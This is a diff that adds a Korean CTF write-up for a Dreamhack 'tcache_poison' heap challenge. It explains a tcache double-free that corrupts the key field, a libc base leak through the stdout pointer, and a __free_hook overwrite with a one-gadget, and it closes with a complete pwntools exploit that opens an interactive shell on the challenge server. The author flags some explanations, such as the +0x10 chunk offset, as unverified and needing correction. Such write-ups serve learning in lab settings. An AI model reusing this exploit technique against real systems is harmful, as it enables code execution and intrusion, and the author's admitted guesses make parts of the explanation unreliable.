@@ -122,3 +122,290 @@ int main()
 
 # Exploit
 
+## [1] Leak libc base
+
+먼저, `libc_base`를 구하기 위해서 `stdout`을 `tcache` 엔트리에 추가해야한다. 그러기 위해선 먼저 `Double Free`를 통해 `tcache Poisoning(Duplication)`을 해주면 된다. 
+
+앞에서 얘기했듯이 `allocate` -> `free` -> `edit`으로 `e->key`를 조작 -> `free` 를 해주면 동일한 청크가 `tcache`에 중복해서 들어가도록 만들 수 있다.
+
+코드는 아래와 같다.
+
+```
+# tcache[0x40] : empty
+# chunk : first(1)
+allocate(0x30, b'first')
+
+
+# tcache[0x40] : first(1)
+free()  # (1)
+
+
+# tcache[0x40] : first(1) -> aaaaaaaa
+# (chunk + 8)에 위치하는 key를 변조해서 Double Free에 걸리지 않기 위해 b'a' 한개 더 대입
+edit(b'a'*0x8 + b'a')
+
+
+# tcache[0x40] : first(2) -> first(1) + 0x10 (동일한 청크가 tcache에 double free되는 경우 헤더를 넘어서서 0x10이 더해짐)
+free()  # (2)
+# LIFO 이기 때문에 이후에 해제된 게 linked list의 헤더에 위치 (같은 first이지만, 순서를 구분하고 LIFO를 보여주기 위해 괄호에 코드의 위치인 (2) 추가)
+```
+
+### 참고
+
+참고로, `tcache` 연결 리스트는 한 thread 당 청크의 크기에 따라 `64`개가 존재하며 하나에 `7`개씩 연결될 수 있다.  따라서, `0x30` 청크를 할당하면 청크의 헤더(metadata) 크기를 포함해서 `tcache[0x40]`에 할당될 것이다.
+
+또한, `LIFO`이기 때문에 `tcache[0x40]` 연결 리스트의 header에 가장 마지막에 해제된 청크가 위치하고, `next`에 그 이전에 연결된 청크가 최근 순으로 계속 쌓여나갈 것이다. (새로 해제된 청크가 제일 앞에 연결된다고 생각하면 된다.)
+
+### 다시 돌아와서..
+
+그럼 이제, `tcache`를 오염시키는 것까지는 성공했기 때문에 중복된 청크를 할당하여 데이터를 write함으로써, `tcache`에 임의의 주소(청크)를 추가할 수 있게 된다.
+
+`allocate(0x30, stdout)`을 해주면, `allocated chunk list`와 `freed chunk list`에 동시에 존재하는 청크에 `stdout`의 주소를 대입하게 되고, `freed chunk list`인 `tcache`의 `next`에 `stdout`이 추가될 것이다.
+
+`allocated chunk list`와 `freed chunk list`의 동일한 청크에 대해 `data`의 위치와 `next(fd)`의 위치가 동일하기 때문이다.
+
+그럼 이제 한번 더 아무 값이나 `allocate`를 해서 `duplicated`된 동일 청크는 이제 사용할 필요가 없기 때문에 빼주고, (아무 값이나 해도 할당 후 데이터를 대입하므로, 할당 직후 데이터를 대입하기 전에 `tcache`의 연결 리스트 헤더가 `stdout` 청크를 가리키게 되어 아무 영향이 없다.)
+
+한번 더, `allocate`를 통해 `stdout` 청크를 빼준 후 `print`를 해주면 `stdout` 청크가 가리키는 `_IO_2_1_stdout_`의 주소를 출력할 수 있을 것이다.\
+(`print` 하기 전에 `recvuntil`로 `"Content: "` 문자열을 미리 빼줘야하는거 주의하자.)
+
+**여기서 매우 중요한게, `allocate`를 통해 `stdout`을 빼낼 때, `stdout`의 데이터에는 `_IO_2_1_stdout_`이 대입되어 있기 때문에 위의 몇가지 경우처럼 아무 값이나 대입하면서 `allocate` 해주면 `_IO_2_1_stdout_`이 변조되어 제대로 된 `libc_base`를 구할 수도 없고 입출력 자체가 망가져 버린다.**
+
+**따라서, `allocate`를 할 때, `p64(libc.symbols['_IO_2_1_stdout_'])[0:1]`을 통해 `_IO_2_1_stdout_`의 `LSB(가장 낮은 바이트)`를 대입해주면 된다.**
+
+**왜냐하면, `ASLR`이 적용되어도 페이징 기법으로 하위 `12bits`는 페이지 오프셋을 나타내서 베이스 주소에 변함없이 고정되어 있기 때문에 `LSB`를 대입해줘도 값의 변조가 없기 때문이다. `p64`에서 첫번째 문자열이 `LSB`를 나타내기 때문에 `[0:1]`을 해주었다.**\
+(참고로, `allocate` 함수에서 데이터를 입력할 때, `read`로 받기 때문에 `send`가 아닌 `sendline`으로 보내면 `LSB + \n`이 전달되서 `_IO_2_1_stdout_`의 하위 2바이트가 `\xa0`으로 바뀌니까 무조건 `send`로 보내야 하는거 주의하자.)
+
+그럼 이제 `libc_base`를 구하는 것까지 완료했다. 이게 **임의 주소 읽기** 과정이다.
+
+```
+# tcache[0x40] : first(1) + 0x10 -> stdout -> _IO_2_1_stdout_
+# chunk : first(2)
+stdout = elf.symbols['stdout']
+allocate(0x30, p64(stdout))
+# 청크의 데이터 영역에 stdout을 대입하면 next가 stdout을 가리키게 되고,
+# stdout의 메모리에 저장된 값은 _IO_2_1_stdout_이므로 stdout의next는 다시 _IO_2_1_stdout_을 가리킴
+
+
+# tcache[0x40] : stdout -> _IO_2_1_stdout_
+# chunk : first(1) (tcache에 들어갈 때는 동일한 청크이면 `+0x10`이 되었지만 할당될때는 또 `+0x10`이 되지 않고 그대로 동일한 청크 주소가 할당됨)
+allocate(0x30, b'a')
+# 어떤 값을 대입하면서 allocate하더라도 이미 tcache에는 stdout이 링크드 리스트의 헤더(청크의 헤더X)로 존재하므로 상관없음
+
+
+# tcache[0x40] : _IO_2_1_stdout_
+# chunk : stdout
+_IO_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]  # 첫번째 문자열 가져옴 : 문자열에서 첫번째는 lsb
+allocate(0x30, _IO_2_1_stdout_lsb)
+# 여기서 중요한게, 바로 아래에서 print_chunk를 할건데, stdout에 저장된(가리키는) _IO_2_1_stdout_을 변조하면 안됨
+# 하지만 libc base를 몰라서 IO_stdout을 모르지만, 다행히 하위 3비트는 오프셋으로 고정되어 있어서 하위 1바이트인 lsb도 고정되있어서 lsb를 대입해주면 됨(리틀엔디언 잘 생각)
+
+
+print_chunk()  # stdout에 저장된 IO_2_1_stdout_lsb 주소 출력
+p.recvuntil(b'Content: ')  # print_chunk에서 'Content: '는 안받아줬기 때문에 여기까지 받아줘야 libc_base를 제대로 계산 가능
+
+# Leak libc base
+libc_base = u64(p.recvn(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']
+```
+
+### 참고 (+ 수정 필요)
+
+`free list`의 청크들 끼리 연결 리스트로 연결할 때, 서로 다른 주소의 청크를 연결할 때는 gdb의 `heap` 명령어를 통해 출력되는 청크의 시작 주소대로 `fd`에 연결되지만, 
+
+동일한 청크를 서로 연결할 때는 아래의 이미지와 같이 동일한 청크임에도 불구하고, `+ 0x10`만큼 더해진 청크가 연결된다. 
+
+![image](https://github.com/user-attachments/assets/d2af5302-c924-4780-9253-3b0b8f5e8bd0)
+
+해당 이유를 명확히 밝혀내지는 못하였는데, 동일한 청크는 `header(metadata)` 때문에 밀려서 연결된다는 답이 있긴 하다.
+
+그리고 `heap`의 `tcache`에서는 이렇게 주소가 차이나지만, 실제로 `malloc`을 연속 2번해서 보면 하나는 `+ 0x10`이 된 주소가 아니라, 당연히 똑같은 청크이기 때문에 똑같은 주소가 `malloc`을 통해 리턴된다.
+
+## [2] Hook Overwrite
+
+그럼 이제 **임의 주소 쓰기**를 통한 `Hook Overwrite`를 어떻게 할지 설계해보자.
+
+당연히 이 과정도 `Tcache Poisoning`이 필요하기 때문에 Leak libc base에서 한 첫번째 과정대로 `duplicated free list(tcache)`를 만들어 준다.
+
+**근데 여기서 매우 주의할 점이 위에서 `tcache[0x40]`의 연결 리스트를 오염시킨 결과로 `tcache`에 `_IO_2_1_stdout`이 존재하기 때문에 해당 연결 리스트에 다시 조작을 하면 표준 입출력 함수가 조작될 수 있기 때문에 새로운 크기의 `tcache[0x50]`으로 다시 시작해줘야 한다.**
+
+그럼 이제 미리 `libc_base`를 통해 `__free_hook`과 `og`를 계산해주고, `__free_hook`의 값을 조작해야 하기 때문에 `allocate(0x40, p64(__free_hook))`으로 `__free_hook`을 `tcache[0x50]`에 추가해준다.
+
+## 수정할 부분 (원가젯)
+
+![image](https://github.com/user-attachments/assets/1a86b142-d49e-453d-b3f1-c06cb5c87426)
+
+그럼 이제 `tcache[0x50]`에는 처음에 `duplicated` 시킨 청크와 `next`로 `__free_hook` 청크가 연결되어 있기 때문에, 일단 처음에 중복시킨 청크는 더이상 쓸 일이 없기 때문에 아무 값으로나 `allocate`해서 빼주고,
+
+이제 `__free_hook` 청크를 `allocate` 하며 빼주면서 `__free_hook`의 데이터에 `og`를 대입해주면 `__free_hook`이 `og`를 가리키게 될 것이다.
+
+그럼 바로 `free`를 호출해서 훅을 통해 원가젯을 실행시키면 익스플로잇 성공이다.
+
+```
+free_hook = libc_base + libc.symbols['__free_hook']
+
+# og = libc_base + 0x4f3ce
+# og = libc_base + 0x4f3d5
+og = libc_base + 0x4f432
+# og = libc_base + 0x10a41c
+
+
+# 여기서 tcache[0x40] 을 다시 쓰면 _IO_2_1_stdout_을 가져오는데 이 주소의 값을 바꾸면 안되므로 다른 tcache 엔트리르 써야함
+
+# tcache[0x50] : empty
+# chunk : first(1)
+allocate(0x40, b'first')
+
+
+# tcahce[0x50] : first(1)
+free()
+
+
+# tcache[0x50] : first(1) -> aaaaaaaa
+edit(b'a'*0x8 + b'a')
+
+
+# tcache[0x50] : first(2) -> first(1) + 0x10
+free()
+
+
+# tcache[0x50] : first(1) + 0x10 -> free_hook
+# chunk : first(2)
+allocate(0x40, p64(free_hook))
+
+
+# tcache[0x50] : free_hook
+# chunk : first(1)
+allocate(0x40, b'a')
+
+
+# tcache[0x50] : empty
+# chunk : free_hook
+allocate(0x40, p64(og))  # free_hook이 저장된 주소에 og가 저장되어 free_hook -> og를 가리키게 됨
+
+
+# Exploit
+free()
+p.interactive()
+```
+
+## 전체 코드
+
+```
+from pwn import *
+
+p = remote('host3.dreamhack.games', 22594)
+elf = ELF('./tcache_poison')
+libc = ELF('./libc-2.27.so')
+
+
+def allocate(size, content):
+    p.sendlineafter(b'Edit\n', b'1')
+    p.sendlineafter(b'Size: ', str(size).encode())
+    p.sendafter(b'Content: ', content)  # 나중에 _IO_2_1_stdout__lsb를 보낼때 sendline으로 보내면 공백이 추가되서 안됨
+
+
+def free():
+    p.sendlineafter(b'Edit\n', b'2')
+
+
+def print_chunk():
+    p.sendlineafter(b'Edit\n', b'3')
+
+
+def edit(content):
+    p.sendlineafter(b'Edit\n', b'4')
+    p.sendafter(b'Edit chunk: ', content)
+
+
+# tcache[0x40] : empty
+# chunk : first(1)
+allocate(0x30, b'first')
+
+
+# tcache[0x40] : first(1)
+free()  # (1)
+
+
+# tcache[0x40] : first(1) -> aaaaaaaa
+# (chunk + 8)에 위치하는 key를 변조해서 Double Free에 걸리지 않기 위해 b'a' 한개 더 대입
+edit(b'a'*0x8 + b'a')
+
+
+# tcache[0x40] : first(2) -> first(1) + 0x10 (동일한 청크가 tcache에 double free되는 경우 헤더를 넘어서서 0x10이 더해짐)
+free()  # (2)
+# LIFO 이기 때문에 이후에 해제된 게 linked list의 헤더에 위치 (같은 first이지만, 순서를 구분하고 LIFO를 보여주기 위해 괄호에 코드의 위치인 (2) 추가)
+
+
+# tcache[0x40] : first(1) + 0x10 -> stdout -> _IO_2_1_stdout_
+# chunk : first(2)
+stdout = elf.symbols['stdout']
+allocate(0x30, p64(stdout))
+# 청크의 데이터 영역에 stdout을 대입하면 next가 stdout을 가리키게 되고,
+# stdout의 메모리에 저장된 값은 _IO_2_1_stdout_이므로 stdout의next는 다시 _IO_2_1_stdout_을 가리킴
+
+
+# tcache[0x40] : stdout -> _IO_2_1_stdout_
+# chunk : first(1) (tcache에 들어갈 때는 동일한 청크이면 `+0x10`이 되었지만 할당될때는 또 `+0x10`이 되지 않고 그대로 동일한 청크 주소가 할당됨)
+allocate(0x30, b'a')
+# 어떤 값을 대입하면서 allocate하더라도 이미 tcache에는 stdout이 링크드 리스트의 헤더(청크의 헤더X)로 존재하므로 상관없음
+
+
+# tcache[0x40] : _IO_2_1_stdout_
+# chunk : stdout
+_IO_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]  # 첫번째 문자열 가져옴 : 문자열에서 첫번째는 lsb
+allocate(0x30, _IO_2_1_stdout_lsb)
+# 여기서 중요한게, 바로 아래에서 print_chunk를 할건데, stdout에 저장된(가리키는) _IO_2_1_stdout_을 변조하면 안됨
+# 하지만 libc base를 몰라서 IO_stdout을 모르지만, 다행히 하위 3비트는 오프셋으로 고정되어 있어서 하위 1바이트인 lsb도 고정되있어서 lsb를 대입해주면 됨(리틀엔디언 잘 생각)
+
+
+print_chunk()  # stdout에 저장된 IO_2_1_stdout_lsb 주소 출력
+p.recvuntil(b'Content: ')  # print_chunk에서 'Content: '는 안받아줬기 때문에 여기까지 받아줘야 libc_base를 제대로 계산 가능
+
+# Leak libc base
+libc_base = u64(p.recvn(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']
+free_hook = libc_base + libc.symbols['__free_hook']
+
+# og = libc_base + 0x4f3ce
+# og = libc_base + 0x4f3d5
+og = libc_base + 0x4f432
+# og = libc_base + 0x10a41c
+
+
+# 여기서 tcache[0x40] 을 다시 쓰면 _IO_2_1_stdout_을 가져오는데 이 주소의 값을 바꾸면 안되므로 다른 tcache 엔트리르 써야함
+
+# tcache[0x50] : empty
+# chunk : first(1)
+allocate(0x40, b'first')
+
+
+# tcahce[0x50] : first(1)
+free()
+
+
+# tcache[0x50] : first(1) -> aaaaaaaa
+edit(b'a'*0x8 + b'a')
+
+
+# tcache[0x50] : first(2) -> first(1) + 0x10
+free()
+
+
+# tcache[0x50] : first(1) + 0x10 -> free_hook
+# chunk : first(2)
+allocate(0x40, p64(free_hook))
+
+
+# tcache[0x50] : free_hook
+# chunk : first(1)
+allocate(0x40, b'a')
+
+
+# tcache[0x50] : empty
+# chunk : free_hook
+allocate(0x40, p64(og))  # free_hook이 저장된 주소에 og가 저장되어 free_hook -> og를 가리키게 됨
+
+
+# Exploit
+free()
+p.interactive()
+```
